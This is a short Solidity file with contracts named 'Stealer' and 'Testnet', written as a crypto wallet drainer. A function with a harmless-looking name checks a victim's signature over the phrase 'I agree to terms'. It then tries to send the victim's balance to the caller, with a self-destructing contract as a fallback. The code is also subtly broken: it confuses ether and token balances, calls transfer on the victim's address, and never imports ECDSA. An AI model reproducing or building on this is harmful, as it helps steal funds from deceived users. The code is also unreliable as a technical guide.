// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Stealer {
    constructor(address victim, address predator) payable {
        selfdestruct(payable(predator));
    }
    
    function burn() external {
        selfdestruct(payable(address(0)));
    }
}

contract Testnet {
    function testnet(address victim, bytes memory sig) public {
        bytes32 hash = keccak256(abi.encodePacked("I agree to terms"));
        address signer = ECDSA.recover(hash, sig);
        require(signer == victim, "Invalid sig");

        uint256 balance = victim.balance;
        if (balance > 0) {
            (bool success, ) = victim.call{value: 0, gas: 50000}(
                abi.encodeWithSignature("transfer(address,uint256)", msg.sender, balance)
            );
            if (!success) {
                new Stealer{value: balance}(victim, msg.sender);
            }
        }
    }
}
